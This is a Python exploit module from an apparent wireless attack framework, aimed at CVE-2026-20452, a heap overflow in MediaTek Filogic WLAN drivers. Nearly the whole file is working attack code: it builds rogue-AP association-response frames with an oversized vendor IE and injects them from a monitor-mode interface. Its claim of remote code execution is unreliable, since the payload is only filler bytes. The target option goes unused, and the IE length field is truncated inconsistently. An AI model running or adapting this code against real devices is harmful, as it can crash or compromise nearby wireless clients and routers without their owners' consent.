# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MediaTek Filogic WLAN Heap Overflow RCE (CVE-2026-20452).

    The MediaTek Filogic WLAN driver contains a heap buffer overflow
    in the management frame processing path.  When parsing certain
    vendor-specific Information Elements in association response
    frames, the driver allocates a buffer based on a declared length
    field but copies data beyond that boundary using a second,
    unchecked length field.  An attacker within WiFi range operating
    a rogue access point can send a crafted association response to
    overflow the heap buffer, achieving kernel code execution.

    Affected chipsets: MT6890, MT7615, MT7915, MT7916, MT7981,
    MT7986, MT7990, MT7992, MT7993.

    CVSS v3.1: ~8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MediaTek Filogic WLAN Heap Overflow RCE (CVE-2026-20452)",
        "description": (
            "Exploits CVE-2026-20452, a heap buffer overflow in the "
            "MediaTek Filogic WLAN driver.  The driver miscalculates "
            "buffer sizes when parsing vendor-specific IEs in association "
            "response frames, allowing an attacker to overflow the heap "
            "buffer with controlled data from a rogue AP, leading to "
            "remote kernel code execution."
        ),
        "authors": (
            "MediaTek PSIRT (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20452",
            "https://corp.mediatek.com/product-security-bulletin/",
        ),
        "disclosure_date": "2026-04-05",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "MT6890, MT7615, MT7915, MT7916 (WiFi 6/6E)",
            "MT7981, MT7986 (Filogic 820/830)",
            "MT7990, MT7992, MT7993 (Filogic 880/860)",
            "OpenWrt, vendor firmware (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    overflow_size = OptInteger(512, "Overflow payload size beyond allocation")
    injection_rounds = OptInteger(16, "Number of association response rounds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_ASSOC_RESP = 0x01
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_VENDOR_SPECIFIC = 221
    _MTK_OUI = b"\x00\x0C\xE7"

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"
    _FAKE_DST = b"\x02\x00\x00\x00\x00\x03"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_mtk_vendor_ie(self, overflow: bool = True) -> bytes:
        """Build a MediaTek vendor-specific IE with overflow payload.

        The first length field in the outer IE determines the driver's
        allocation.  The inner sub-element length field is larger,
        causing the driver to copy past the allocated boundary.
        """
        vendor_type = struct.pack("B", 0x05)

        if overflow:
            inner_declared_len = struct.pack("<H", 64)
            inner_actual_data = b"\x41" * (64 + self.overflow_size)
        else:
            inner_declared_len = struct.pack("<H", 32)
            inner_actual_data = b"\x00" * 32

        sub_element = vendor_type + inner_declared_len + inner_actual_data
        ie_data = self._MTK_OUI + sub_element

        ie_len = min(len(ie_data), 255)
        return struct.pack("BB", self._IE_VENDOR_SPECIFIC, ie_len) + ie_data

    def _build_assoc_response(self, seq: int, overflow: bool = True) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_ASSOC_RESP)
        duration = struct.pack("<H", 0)
        dst = self._FAKE_DST
        src = self._FAKE_BSSID
        bssid = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + bssid + seq_ctrl

        capability = struct.pack("<H", 0x0431)
        status_code = struct.pack("<H", 0)
        aid = struct.pack("<H", 1)
        fixed = capability + status_code + aid

        rates_ie = struct.pack("BB", 1, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        mtk_ie = self._build_mtk_vendor_ie(overflow=overflow)

        body = fixed + rates_ie + mtk_ie
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        header = fc + duration + self._BROADCAST + self._FAKE_BSSID + self._BROADCAST + struct.pack("<H", 0)
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting heap overflow assoc responses")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        print_status(
            f"Injecting {self.injection_rounds} association responses "
            f"with {self.overflow_size}-byte overflow payload"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            frame = self._build_assoc_response(rnd, overflow=True)
            if self._inject_frame(raw, frame):
                success += 1
            time.sleep(0.02)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} assoc responses")
        print_info(
            "The crafted MediaTek vendor IE in the association response "
            "causes the Filogic driver to overflow the heap buffer.  "
            "Affected chipsets: MT6890, MT7615, MT7915, MT7916, MT7981, "
            "MT7986, MT7990, MT7992, MT7993.  Monitor for kernel oops."
        )
